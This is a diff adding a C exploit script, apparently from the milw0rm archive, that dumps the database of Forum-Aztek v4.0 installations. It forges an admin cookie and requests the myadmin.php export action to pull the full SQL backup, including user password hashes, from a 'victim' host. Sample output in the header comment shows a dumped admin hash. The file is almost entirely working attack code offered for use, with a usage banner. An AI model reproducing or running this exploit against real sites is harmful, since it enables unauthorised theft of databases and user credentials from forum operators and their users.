@@ -1,0 +1,106 @@
+/* Changed line 81 - Tested and working /str0ke */
+
+/*
+ *   LOTFREE Team presents :
+ * Forum-Aztek v4.0 (4nd pr0b4bly inf3ri0r) Database Dump Xpl0it
+ * 0day dUd3 X-)
+ *
+ * ./aztek-sploit 127.0.0.1 admin forum
+ * HTTP/1.1 200 OK
+ * Date: Sat, 05 Mar 2005 22:18:13 GMT
+ * Server: Apache/2.0.50 (Ubuntu) PHP/4.3.8
+ * X-Powered-By: PHP/4.3.8
+ * Set-Cookie: ATK_ADMIN=
+ * Expires: Sat, 05 Mar 2005 22:18:13 GMT
+ * Content-Disposition: attachment; filename="backup-admin-2005-5-03-23-18-13.sql"
+ * Connection: close
+ * Transfer-Encoding: chunked
+ * Content-Type: application/force-download
+ *
+ * (...)
+ * INSERT INTO atk_users VALUES ('admin','admin','atm5zzHCTXNkc',0,'',0,0,0,'','',0,0,'','',1109861125,63,'0','','','','','',0,0,'');
+ *                            password in DES ---+^^^^^^^^^^^^^
+ * (...)
+ * sw333333t !
+ * http://lotfree.next-touch.com
+ */
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <string.h>
+
+#define REQ1 "/myadmin.php?action=export_index&login="
+#define REQ2 " HTTP/1.1\nHost: "
+#define REQ3 "\nCookie: ATK_ADMIN=blah; ATK_LOGIN="
+#define REQ4 "\nConnection: close\n\n"
+
+unsigned long resolve (char *host) 
+{
+  struct in_addr in; 
+  struct hostent *he; 
+	    
+  if((in.s_addr=inet_addr(host))==-1) 
+  { 
+    if((he=(struct hostent*)gethostbyname(host))==NULL) 
+    { 
+      herror("Resolving victim host"); 
+      exit(1); 
+    } 
+    memcpy((caddr_t)&in, he->h_addr, he->h_length); 
+  }
+  return(in.s_addr); 
+}
+
+int main(int argc,char *argv[])
+{
+  int sock;
+  struct sockaddr_in sin;
+  char c;
+
+  if(argc!=4)
+  {
+    printf("[*]--------------------------------[*]\n");
+    printf(" | Aztek-Forum Database Dump Xploit |\n");
+    printf(" |   sirius_black // LOTFREE Team   |\n");
+    printf("[*]--------------------------------[*]\n\n");
+    printf("Usage: %s <victim> <admin_login> <forum_directory>\n\n",argv[0]);
+    printf("Exemple: %s www.tictactoe.com admin forum > database.sql\n\n",argv[0]);
+    exit(1);
+  }
+  if((sock=socket(PF_INET,SOCK_STREAM,0))==-1)
+  {
+    perror("socket");
+    exit(1);
+  }
+  sin.sin_family=AF_INET;
+  sin.sin_port=htons(80);
+  sin.sin_addr.s_addr=resolve(argv[1]);//  sin.sin_addr.s_addr=resolve("127.0.0.1");
+  if(connect(sock,(struct sockaddr*)&sin,sizeof(struct sockaddr))==-1)
+  {
+    perror("connect");
+    exit(1);
+  }
+  send(sock,"GET /",5,0);
+  send(sock,argv[3],strlen(argv[3]),0);
+  send(sock,REQ1,sizeof(REQ1)-1,0);
+  send(sock,argv[2],strlen(argv[2]),0);
+  send(sock,REQ2,sizeof(REQ2)-1,0);
+  send(sock,argv[1],strlen(argv[1]),0);
+  send(sock,REQ3,sizeof(REQ3)-1,0);
+  send(sock,argv[2],strlen(argv[2]),0);
+  send(sock,REQ4,sizeof(REQ4)-1,0);
+  while((recv(sock,&c,1,0))==1)
+  {
+    putchar(c);
+  }
+  close(sock);
+  return 0;
+}
+
+// milw0rm.com [2005-03-07]
